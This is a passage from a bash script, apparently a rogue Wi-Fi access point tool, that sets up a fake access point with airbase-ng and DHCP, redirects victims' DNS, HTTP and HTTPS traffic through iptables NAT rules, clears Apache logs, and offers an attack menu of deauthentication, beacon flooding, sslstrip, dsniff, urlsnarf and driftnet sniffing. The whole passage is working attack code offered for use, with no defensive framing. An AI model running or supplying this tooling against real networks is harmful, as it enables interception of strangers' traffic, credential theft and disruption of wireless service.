#airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
sleep 4
ifconfig at0 up
ifconfig at0 $at0IP netmask $NETMASK
ifconfig at0 mtu $MTU
# route add -net 169.254.0.0 netmask 255.255.0.0 gw 0.0.0.0
# route add -net $at0IPBLOCK netmask $NETMASK gw $at0IP
echo "+===================================+"
if [ "$DHCPSERVER" = "1" ]; then dnsmasqserver; fi
if [ "$DHCPSERVER" = "2" ]; then dhcpd3server; fi
if [ "$DHCPSERVER" = "3" ]; then udhcpdserver; fi
if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
echo "+===================================+"
if [ "$mode" = "1" ]; then
service apache2 stop > /dev/null
ERRORFILE=$(awk '/index/ { print $1 }' < <(ls /var/www))
if [ "$ERRORFILE" = "" ]; then ERRORFILE=index.php; fi
echo "ErrorDocument 404 /$ERRORFILE" > /etc/apache2/conf.d/localized-error-pages
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
APACHECONF=/etc/apache2/sites-available
if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
else cp $APACHECONF/default $APACHECONF/default~; fi
replace ${APACHE_LOG_DIR} $folder/ -- $APACHECONF/default &>/dev/null
replace /var/log/apache2/ $folder/ -- $APACHECONF/default &>/dev/null
service apache2 start > /dev/null
firewall
iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP:53
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP:53
#iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP:67
#iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP:67
#iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $at0IP:68
#iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $at0IP:68
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP:443
cp /etc/resolv.conf /etc/resolv.conf~
chmod a+w /etc/resolv.conf
echo "# Generated by accesspoint.sh" > /etc/resolv.conf
echo "nameserver $GATEWAY" >> /etc/resolv.conf
echo "nameserver $at0IP" >> /etc/resolv.conf
chmod a-w /etc/resolv.conf
echo "+===================================+"
echo "| APACHE2 WEB SERVER!!!             |"
echo "+===================================+"
fi
if [ "$mode" = "2" ]; then
firewall
iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP
iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP
iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp -j DNAT --to $GW
iptables -t nat -A PREROUTING -p udp -j DNAT --to $GW
iptables -t nat -A POSTROUTING -o $LANIFACE -j MASQUERADE
#iptables -t nat -A PREROUTING -i $LANIFACE -p tcp --dport 80 -j REDIRECT --to-port 3128
#iptables -t nat -A POSTROUTING -o $LANIFACE -p tcp --dport 3128 -j REDIRECT --to-port 80
fi
taillogs
attackmenu
if [ "$attack" = "1" ]; then deauth; fi
if [ "$attack" = "2" ]; then wireshark -i at0 -p -k -w $folder/at0.pcap; fi
if [ "$attack" = "3" ]; then dsniff -m -i at0 -d -w $folder/dsniff.log; fi
if [ "$attack" = "4" ]; then urlsnarf -i at0; fi
if [ "$attack" = "5" ]; then driftnet -i at0; fi
if [ "$attack" = "6" ]; then sslstrip -a -k -f; fi
if [ "$attack" = "7" ]; then beaconflood; fi
if [ "$attack" = "8" ]; then exit 0; fi
if [ "$attack" = "9" ]; then
echo ""
echo "ATEMPTING TO END ATTACK..."
stopshit
monitormodestop
kill `cat $folder/probe.pid`
kill `cat $folder/pwned.pid`
kill `cat $folder/web.pid`
cleanup
if [ "$DHCPSERVER" = "1" ]; then killall -9 dnsmasq; fi
if [ "$DHCPSERVER" = "2" ]; then kill `cat /var/run/dhcpd/at0.pid`; fi
if [ "$DHCPSERVER" = "3" ]; then killall -9 udhcpd; fi
#firefox http://www.hackerbusters.ca/
read -e -p "DONE THANKS FOR PLAYING YOU MAY NOW CLOSE THIS WINDOW "
fi
